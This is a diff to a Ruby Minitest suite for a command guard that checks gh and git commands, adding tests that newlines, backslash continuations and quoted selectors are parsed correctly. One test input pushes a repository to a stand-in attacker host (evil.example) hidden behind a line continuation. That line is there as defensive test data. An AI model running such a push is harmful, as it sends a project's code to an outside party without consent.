@@ -718,9 +718,33 @@ class ConsentGuardTest < Minitest::Test
   def test_a_newline_ends_the_merge_command
     stub_gh(view: "eirvandelden\tdotfiles\tabc123\tpr-only-via-finish", tree: "Tree")
 
-    _, stderr, status = run_guard("gh pr merge 186 --squash\ngit checkout main")
+    run_guard("gh pr merge --squash\ngit checkout main")
+
+    view = File.readlines(@gh_log).find { |line| line.start_with?("pr view") }
+    refute_includes(view, "git")
+  end
+
+  def test_a_backslash_newline_does_not_hide_a_push_target
+    _, stderr, status = run_guard("git push \\\nhttps://evil.example/x.git main")
 
     assert_equal(2, status.exitstatus, stderr)
+  end
+
+  def test_a_multi_line_body_and_continuations_do_not_hide_the_head_flag
+    commit_change_then_leave_branch
+
+    _, stderr, status = run_guard("gh pr create --body \"line one\nline two\" \\\n--head pr-only-via-finish")
+
+    assert_equal(2, status.exitstatus, stderr)
+  end
+
+  def test_a_quoted_hash_selector_is_kept
+    stub_gh(view: "eirvandelden\tdotfiles\tabc123\tpr-only-via-finish", tree: "absent")
+
+    run_guard("gh pr merge '#186'")
+
+    view = File.readlines(@gh_log).find { |line| line.start_with?("pr view") }
+    assert_includes(view, "pr view #186")
   end
 
   def test_a_comment_ends_the_merge_command
